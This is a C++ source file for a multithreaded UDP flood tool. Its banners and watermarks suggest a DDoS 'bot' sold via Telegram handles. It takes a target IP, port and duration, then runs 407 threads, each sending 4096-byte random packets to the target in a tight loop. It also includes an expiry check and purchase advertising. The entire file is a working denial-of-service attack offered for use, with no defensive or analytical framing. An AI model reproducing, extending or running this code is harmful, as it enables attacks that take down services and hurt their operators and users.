#include <iostream>
#include <cstring>
#include <thread>
#include <vector>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <ctime>
#include <random>
//MADE BY MOINVIPDDOS
//MADE BY MOINVIPDDOS
//MADE BY MOINVIPDDOS//MADE BY MOINVIPDDOS//MADE BY MOINVIPDDOS//MADE BY MOINVIPDDOS//MADE BY MOINVIPDDOS//MADE BY MOINVIPDDOS//MADE BY MOINVIPDDOS//MADE

#define MAX_THREADS 407
#define EXPIRY_YEAR 2025
#define EXPIRY_MONTH 12
#define EXPIRY_DAY 31

using namespace std;


void print_usage(const char *prog_name) {
    cout << "Usage: " << prog_name << " <target IP> <port> <time duration>" << endl;
    exit(EXIT_FAILURE);
}


void check_expiry() {
    time_t t = time(nullptr);
    struct tm *current_time = localtime(&t);

    if ((current_time->tm_year + 1900 > EXPIRY_YEAR) ||
        (current_time->tm_year + 1900 == EXPIRY_YEAR && current_time->tm_mon + 1 > EXPIRY_MONTH) ||
        (current_time->tm_year + 1900 == EXPIRY_YEAR && current_time->tm_mon + 1 == EXPIRY_MONTH && current_time->tm_mday > EXPIRY_DAY)) {
        cout << "This file has expired. Please contact @Vip_Ddos_07 for updates." << endl;
        exit(EXIT_FAILURE);
    }
}


string generate_payload(size_t size) {
    static const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!Bgmikimaakichut@#$%^&*()_+-=[]{}|;:'\",.<>?/`~";
    random_device rd; 
    mt19937 generator(rd());
    uniform_int_distribution<> dist(0, sizeof(charset) - 2); 
    string payload;
    payload.reserve(size);

    for (size_t i = 0; i < size; ++i) {
        payload += charset[dist(generator)];
    }
    return payload;
}


void flood(const string &target_ip, int port, int duration) {
    struct sockaddr_in target;
    string payload = generate_payload(4096); // 

    
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        cerr << "Socket creation failed." << endl;
        return;
    }

   
    target.sin_family = AF_INET;
    target.sin_port = htons(port);
    if (inet_pton(AF_INET, target_ip.c_str(), &target.sin_addr) <= 0) {
        cerr << "Invalid target IP address." << endl;
        close(sock);
        return;
    }

    
    cout << "Flood started to " << target_ip << " with 1 Thread for time " << duration << " seconds." << endl;
    cout << "WATERMARK: THIS BOT PROVIDE BY @MOINVIPDDOS\nDM FOR BUY : @Vip_Ddos_07" << endl;

    time_t start_time = time(nullptr);
    while (difftime(time(nullptr), start_time) < duration) {
        if (sendto(sock, payload.c_str(), payload.size(), 0, (struct sockaddr *)&target, sizeof(target)) < 0) {
            cerr << "Failed to send packet." << endl;
        }
    }

    close(sock);
    cout << "Thread finished sending packets." << endl;
}

int main(int argc, char *argv[]) {
    
    check_expiry();

    if (argc != 4) {
        print_usage(argv[0]);
    }

    
    cout << "This file is closed by @Vip_Ddos_07." << endl;
    cout << "JOIN CHANNEL TO USE THIS FILE.@MOINVIPDDOS" << endl;

    
    string target_ip = argv[1];
    int port = stoi(argv[2]);
    int duration = stoi(argv[3]);

    cout << "STARTING ATTACKS BY @MOINVIPDDOS ON : " << target_ip << " on port " << port << " for " << duration << " seconds using " << MAX_THREADS << " threads." << endl;

  
    vector<thread> threads;
    for (int i = 0; i < MAX_THREADS; ++i) {
        threads.emplace_back(flood, target_ip, port, duration);
    }

    
    for (auto &t : threads) {
        if (t.joinable()) {
            t.join();
        }
    }

    cout << "WATERMARK ATTACK COMPLETED BY @MOINVIPDDOS" << endl;
    return 0;
}
